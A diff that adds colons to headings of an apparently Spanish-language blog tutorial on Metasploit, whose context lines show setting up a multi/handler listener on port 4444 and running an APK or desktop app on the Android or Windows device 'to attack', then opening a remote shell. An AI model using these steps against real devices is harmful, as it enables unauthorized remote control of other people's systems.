@@ -10,12 +10,12 @@ la instalacion de texmux la encuentra [aqui][aqui]
 
 
 
-Actualizar repositorios
+Actualizar repositorios:
 
     apt update && apt upgrade
 
 
-instalacion de Metasploit
+instalacion de Metasploit:
 
 
     pkg install unstable-repo
@@ -42,7 +42,7 @@ abrimos la consola:
 <img src="{{ "/assets/img/msfconsole.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">
   
 
-preparamos metasploit
+preparamos metasploit:
 ```shell    
     use multi/handler
     
@@ -52,7 +52,7 @@ preparamos metasploit
     
     set lport 4444
 ```
-instalamos y ejecutamos el apk en el android a atacar
+instalamos y ejecutamos el apk en el android a atacar:
 
 <img src="{{ "/assets/img/apk.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">
 
@@ -83,7 +83,7 @@ abrimos la consola:
 <img src="{{ "/assets/img/msfconsole2.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">
   
 
-preparamos metasploit
+preparamos metasploit:
 
     use multi/handler
 
@@ -93,7 +93,7 @@ preparamos metasploit
 
     set lport 4444
 
-ejecutamos la aplicacion de escritorio en el windows a atacar
+ejecutamos la aplicacion de escritorio en el windows a atacar:
 
 <img src="{{ "/assets/img/app.jpg" | relative_url }}" alt="{{ site.plainwhite.name }}">
 
@@ -107,11 +107,11 @@ ejecutamos el exploit:
 ### comandos basicos
 
 
-nos muestra las opciones disponibles
+nos muestra las opciones disponibles:
 
     help
 
-nos permite ingresar a la consola de windows
+nos permite ingresar a la consola de windows:
 
     shell
     
